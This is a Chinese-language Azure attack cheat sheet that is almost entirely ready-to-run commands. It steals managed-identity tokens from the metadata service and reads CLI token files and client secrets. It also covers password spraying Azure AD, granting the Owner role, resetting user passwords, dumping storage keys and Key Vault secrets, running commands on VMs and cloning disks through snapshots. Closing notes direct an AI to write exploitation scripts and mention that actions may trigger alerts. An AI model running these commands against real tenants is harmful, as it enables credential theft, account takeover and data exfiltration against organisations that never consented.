# Azure 安全

Microsoft Azure 是第二大云服务提供商，其安全测试涉及Azure AD、存储账户、虚拟机等服务。

## 信息收集

### 元数据服务
```bash
# 获取访问令牌
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 获取实例信息
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### 凭证位置
```bash
# Azure CLI 配置
cat ~/.azure/accessTokens.json
cat ~/.azure/azureProfile.json

# 环境变量
echo $AZURE_CLIENT_ID
echo $AZURE_CLIENT_SECRET
echo $AZURE_TENANT_ID
```

### 枚举
```bash
# 当前用户
az account show
az ad signed-in-user show

# 订阅
az account list

# 资源组
az group list
```

## Azure AD 攻击

### 用户枚举
```bash
# 列出用户
az ad user list

# 获取用户详情
az ad user show --id <user-id>

# 列出组
az ad group list

# 列出服务主体
az ad sp list
```

### 密码喷洒
```bash
# 使用 MSOLSpray
Import-Module MSOLSpray.ps1
Invoke-MSOLSpray -UserList users.txt -Password "Password123!"

# 使用 AADInternals
Import-Module AADInternals
Invoke-AADIntPasswordSpray -UserList users.txt -Password "Password123!"
```

### 权限提升
```bash
# 添加用户到角色
az role assignment create --assignee <user-id> --role "Owner" --scope /subscriptions/<subscription-id>

# 重置密码
az ad user update --id <user-id> --password "NewPassword123!"
```

## 存储账户

### 枚举
```bash
# 列出存储账户
az storage account list

# 获取密钥
az storage account keys list --account-name <name>

# 列出容器
az storage container list --account-name <name> --account-key <key>

# 列出 Blob
az storage blob list --container-name <container> --account-name <name> --account-key <key>
```

### 公开访问
```bash
# 检查公开容器
az storage container show --name <container> --account-name <name>

# 匿名访问
curl https://<account>.blob.core.windows.net/<container>/<blob>
```

### SAS Token
```bash
# 生成 SAS Token
az storage container generate-sas --name <container> --account-name <name> --account-key <key> --permissions rwdl --expiry 2025-12-31

# 使用 SAS Token
az storage blob list --container-name <container> --account-name <name> --sas-token <token>
```

## 虚拟机

### 枚举
```bash
# 列出虚拟机
az vm list

# 获取虚拟机详情
az vm show --name <name> --resource-group <group>

# 列出磁盘
az disk list

# 列出快照
az snapshot list
```

### 运行命令
```bash
# 在虚拟机上执行命令
az vm run-command invoke --name <vm-name> --resource-group <group> --command-id RunShellScript --scripts "whoami"
```

### 磁盘快照
```bash
# 创建快照
az snapshot create --name <snapshot-name> --resource-group <group> --source <disk-id>

# 创建磁盘
az disk create --name <disk-name> --resource-group <group> --source <snapshot-id>

# 挂载磁盘
az vm disk attach --vm-name <vm-name> --name <disk-name> --resource-group <group>
```

## Key Vault

### 枚举
```bash
# 列出 Key Vault
az keyvault list

# 列出密钥
az keyvault secret list --vault-name <name>

# 获取密钥
az keyvault secret show --vault-name <name> --name <secret-name>
```

### 访问策略
```bash
# 查看访问策略
az keyvault show --name <name> --query properties.accessPolicies

# 添加访问策略
az keyvault set-policy --name <name> --object-id <user-id> --secret-permissions get list
```

## Function App

### 枚举
```bash
# 列出 Function App
az functionapp list

# 获取配置
az functionapp config appsettings list --name <name> --resource-group <group>

# 获取函数密钥
az functionapp function keys list --name <name> --resource-group <group> --function-name <function>
```

### 执行函数
```bash
# 调用函数
curl https://<app-name>.azurewebsites.net/api/<function-name>?code=<key>
```

## 自动化工具

### ROADtools
```bash
# Azure AD 侦察
roadrecon auth -u user@domain.com -p password
roadrecon gather
roadrecon gui
```

### Stormspotter
```bash
# Azure 环境可视化
python stormspotter.py
```

### MicroBurst
```powershell
# Azure 安全评估
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureSubDomains -Base <company>
Get-AzurePasswords
```

### ScoutSuite
```bash
# 多云安全审计
scout azure
```

---

**AI 发挥空间**：
- 根据Azure服务选择合适的测试方法
- 识别Azure配置错误和权限问题
- 开发自动化枚举和利用脚本
- 分析Azure AD和RBAC权限

**反幻觉提示**：
- 不要假设所有Azure资源都可访问
- 验证凭证的实际权限
- 测试操作的实际效果
- 注意Azure操作可能触发告警
- 某些操作可能需要特定的Azure角色
